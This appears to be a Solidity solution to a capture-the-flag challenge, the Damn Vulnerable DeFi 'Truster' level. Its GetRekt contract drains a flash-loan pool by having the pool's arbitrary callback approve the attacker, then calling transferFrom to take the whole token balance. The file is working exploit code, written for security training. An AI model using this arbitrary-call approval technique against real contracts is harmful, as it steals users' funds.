// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract GetRekt {
    /**
    @param _lenderPoolAddr Address of lender pool
    @dev The logic for the hack is, the lender allows you to specify any arbitray function call (in the form of encoded data) as callback before it verifies flash loan payback.

    If we give ourselves allowance to all its tokens in the callback, then after that transaction, transfer all tokens to us, THEY GET REKT!
     */
    function stealAllTokens(address _lenderPoolAddr) external {
        TrusterLenderPool lender = TrusterLenderPool(_lenderPoolAddr);
        IERC20 damnValuableToken = IERC20(lender.damnValuableToken());

        // Give this contract allowance of all lender's DVT tokens
        uint256 lenderBalanceDvt = damnValuableToken.balanceOf(_lenderPoolAddr);
        bytes memory allowanceTxData = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            lenderBalanceDvt
        );
        lender.flashLoan(
            0,
            address(this),
            address(damnValuableToken),
            allowanceTxData
        );

        // Transfer ourselves all funds
        damnValuableToken.transferFrom(
            _lenderPoolAddr,
            msg.sender,
            lenderBalanceDvt
        );
    }
}
